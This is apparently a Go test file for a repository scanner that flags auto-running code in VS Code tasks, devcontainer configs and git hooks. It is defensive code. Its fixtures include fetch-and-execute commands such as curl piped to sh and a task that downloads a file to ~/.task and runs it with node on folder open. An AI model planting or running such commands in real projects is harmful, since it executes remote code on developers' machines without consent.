package analyze

import (
	"strings"
	"testing"
)

// scannedFile builds a ScannedFile with Lines populated, matching how
// walkFiles constructs one (some autorun paths inspect Lines).
func scannedFile(relPath, content string) ScannedFile {
	return ScannedFile{
		RelPath: relPath,
		Content: content,
		Lines:   strings.Split(content, "\n"),
	}
}

func TestAutorunAnalyzer(t *testing.T) {
	// A folderOpen tasks.json whose launcher has NO pipe-to-shell, so
	// regex.go's download-exec pattern would not fire: the autorun analyzer
	// must still flag it, because the placement (run-on-open) is the signal.
	pipelessFolderOpen := `{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "build",
      "type": "shell",
      "command": "curl -s https://x.vercel.app/a -o ~/.task/a && node ~/.task/a",
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}`

	tests := []struct {
		name    string
		relPath string
		content string
		wantAny bool
		wantSev Severity // max severity must be >= this when wantAny
	}{
		{
			name:    "folderOpen task with pipeless launcher",
			relPath: ".vscode/tasks.json",
			content: pipelessFolderOpen,
			wantAny: true,
			wantSev: High,
		},
		{
			name:    "folderOpen task with curl pipe sh",
			relPath: ".vscode/tasks.json",
			content: `{"tasks":[{"command":"curl x | sh","runOptions":{"runOn":"folderOpen"}}]}`,
			wantAny: true,
			wantSev: High,
		},
		{
			name:    "tasks.json without folderOpen is not an autorun finding",
			relPath: ".vscode/tasks.json",
			content: `{"tasks":[{"label":"build","command":"npm run build","runOptions":{"runOn":"default"}}]}`,
			wantAny: false,
		},
		{
			name:    "tasks.json folderOpen but no command is inert",
			relPath: ".vscode/tasks.json",
			content: `{"tasks":[{"label":"noop","runOptions":{"runOn":"folderOpen"}}]}`,
			wantAny: false,
		},
		{
			name:    "devcontainer postCreateCommand",
			relPath: ".devcontainer/devcontainer.json",
			content: `{"image":"node:22","postCreateCommand":"npm install"}`,
			wantAny: true,
			wantSev: Low,
		},
		{
			name:    "top-level .devcontainer.json initializeCommand",
			relPath: ".devcontainer.json",
			content: `{"initializeCommand":"./setup.sh"}`,
			wantAny: true,
			wantSev: Low,
		},
		{
			name:    "devcontainer without lifecycle command",
			relPath: ".devcontainer/devcontainer.json",
			content: `{"image":"node:22","forwardPorts":[3000]}`,
			wantAny: false,
		},
		{
			name:    "committed husky hook with a body",
			relPath: ".husky/pre-commit",
			content: "#!/bin/sh\nnpm test\n",
			wantAny: true,
			wantSev: Low,
		},
		{
			name:    "githooks hook",
			relPath: ".githooks/post-checkout",
			content: "#!/bin/bash\ncurl https://x/a && bash a\n",
			wantAny: true,
			wantSev: Low,
		},
		{
			name:    "husky internal helper dir is not a user hook",
			relPath: ".husky/_/husky.sh",
			content: "#!/bin/sh\nexport whatever\n",
			wantAny: false,
		},
		{
			name:    "comment-only hook is inert",
			relPath: ".husky/pre-push",
			content: "#!/bin/sh\n# nothing here\n",
			wantAny: false,
		},
		{
			name:    "unrelated json is ignored",
			relPath: "package.json",
			content: `{"scripts":{"postinstall":"curl x | sh"}}`,
			wantAny: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings, err := autorunAnalyzer{}.Analyze([]ScannedFile{scannedFile(tt.relPath, tt.content)})
			if err != nil {
				t.Fatalf("Analyze: %v", err)
			}
			if tt.wantAny && len(findings) == 0 {
				t.Fatalf("expected at least one finding, got none")
			}
			if !tt.wantAny && len(findings) != 0 {
				t.Fatalf("expected no findings, got %+v", findings)
			}
			if tt.wantAny {
				max := Info
				for _, f := range findings {
					if f.Category != "autorun" {
						t.Errorf("finding category = %q, want autorun", f.Category)
					}
					if f.Severity > max {
						max = f.Severity
					}
				}
				if max < tt.wantSev {
					t.Errorf("max severity = %s, want at least %s", max, tt.wantSev)
				}
			}
		})
	}
}

// TestAutorunCorrelatesWithRegex proves the end-to-end value: a folderOpen
// tasks.json whose command matches a regex.go signal produces BOTH the autorun
// location finding and the regex content finding, and the correlate pass lifts
// the pair into an additional High. This is checked through the full Scan
// pipeline against an in-repo fixture.
func TestAutorunPresentInScanPipeline(t *testing.T) {
	files := []ScannedFile{
		scannedFile(".vscode/tasks.json", `{"tasks":[{"command":"curl https://x.vercel.app/a | sh","runOptions":{"runOn":"folderOpen"}}]}`),
	}
	var got []Finding
	f, err := autorunAnalyzer{}.Analyze(files)
	if err != nil {
		t.Fatalf("autorun Analyze: %v", err)
	}
	r, err := regexAnalyzer{}.Analyze(files)
	if err != nil {
		t.Fatalf("regex Analyze: %v", err)
	}
	got = append(got, f...)
	got = append(got, r...)
	extra := correlate(got)

	if len(f) == 0 {
		t.Fatalf("autorun produced no finding for a folderOpen curl|sh task")
	}
	if len(r) == 0 {
		t.Fatalf("regex produced no finding for a curl|sh command")
	}
	if len(extra) == 0 {
		t.Errorf("correlate did not escalate co-located autorun + download-exec signals")
	}
}
